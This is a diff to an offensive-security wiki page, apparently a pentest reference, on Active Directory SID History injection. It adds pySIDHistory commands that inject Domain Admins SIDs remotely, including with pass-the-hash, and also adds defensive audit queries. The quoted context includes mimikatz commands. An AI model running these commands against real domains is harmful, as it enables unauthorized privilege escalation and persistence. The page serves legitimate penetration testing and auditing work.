@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo
+authors: ShutdownRepo, felixbillieres
 category: ad
 ---
 
@@ -17,10 +17,13 @@ For instance, the SID of an account with Domain Admin rights can be added to a n
 
 ## Practice
 
-> [!CAUTION]
-> There is currently no way to exploit this technique purely from a distant UNIX-like machine, as it requires some operations on specific Windows processes' memory.
+### Injecting SID History
 
-### Pre-Windows 2016
+::: tabs
+
+=== Windows
+
+#### Pre-Windows 2016
 
 Modifying the SID History attribute of an object can be done using mimikatz, with the [`sid::patch`](https://tools.thehacker.recipes/mimikatz/modules/sid/patch), [`sid::add`](https://tools.thehacker.recipes/mimikatz/modules/sid/add) and [`sid::lookup`](https://tools.thehacker.recipes/mimikatz/modules/sid/lookup) commands.
 
@@ -41,7 +44,7 @@ mikikatz.exe "sid::lookup /name:InterestingUser"
 mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:SIDOfInterestingUser"
 ```
 
-### Post-Windows 2016
+#### Post-Windows 2016
 
 The only known way to add a SID to the SID History attribute of an account on a Windows domain controller 2016 and above is to use the Powershell module [DSInternals](https://github.com/MichaelGrafnetter/DSInternals). This method also works for Pre-Windows 2016 domain controllers.
 
@@ -76,7 +79,92 @@ Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUse
 Start-service NTDS
 ```
 
+=== UNIX-like
+
+[pySIDHistory](https://github.com/felixbillieres/pySIDHistory) (Python) enables remote SID History injection from Linux-based platforms, without requiring direct access to the domain controller. It supports two injection methods and multiple authentication options.
+
+> [!CAUTION]
+> The DSInternals method **stops the NTDS service** on the target DC to modify `ntds.dit` offline, causing a brief authentication outage (~5-10s). **Do not run against production domain controllers.**
+
+#### DSInternals method (default)
+
+Stops NTDS, modifies `ntds.dit` offline via DSInternals, restarts NTDS. Works same-domain and can inject any SID including privileged ones (RID < 1000).
+
+```bash
+# Same-domain: inject Domain Admins SID
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --force
+
+# Cross-domain: inject DA from a foreign domain
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --inject-domain $FOREIGN_DOMAIN --force
+
+# Raw SID injection
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --inject $SID --force
+```
+
+#### DRSUAPI method (cross-forest, stealth)
+
+Calls `DRSAddSidHistory` (opnum 20) over RPC. No disk writes, no service, no NTDS downtime. Limited to RID > 1000 due to SID filtering at forest trust boundaries.
+
+```bash
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --target $TARGET --method drsuapi \
+    --source-user $SRC_USER --source-domain $SRC_DOMAIN \
+    --src-username $SRC_USER --src-password $SRC_PASSWORD --src-domain $SRC_DOMAIN
+```
+
+Pass-the-Hash and Kerberos authentication are also supported:
+
+```bash
+# Pass-the-Hash authentication
+python3 main.py -d $DOMAIN -u $USER --ntlm-hash $NT_HASH --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --force
+
+# Kerberos authentication
+python3 main.py -d $DOMAIN -u $USER --kerberos --ccache $CCACHE --dc-ip $DC_IP \
+    --target $TARGET --inject domain-admins --force
+```
+
+:::
+
+### Auditing SID History
+
+::: tabs
+
+=== Windows
+
+SID History can be queried using standard AD tools such as PowerShell's `Get-ADUser` cmdlet with the `-Properties SIDHistory` parameter, or through LDAP queries filtering on the `sIDHistory` attribute.
+
+```powershell
+Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory -ne $null }
+```
+
+=== UNIX-like
+
+[pySIDHistory](https://github.com/felixbillieres/pySIDHistory) (Python) can audit SID History across the domain with risk assessment:
+
+```bash
+# Query sIDHistory of a specific user
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --query $TARGET
+
+# Domain-wide audit with risk assessment
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --audit
+
+# JSON export for SIEM integration
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
+    --audit -o json --output-file audit.json
+
+# Enumerate domain trusts and SID filtering status
+python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --enum-trusts
+```
+
+:::
+
 ## Resources
+
+[https://github.com/felixbillieres/pySIDHistory](https://github.com/felixbillieres/pySIDHistory)
 
 [https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory)
 
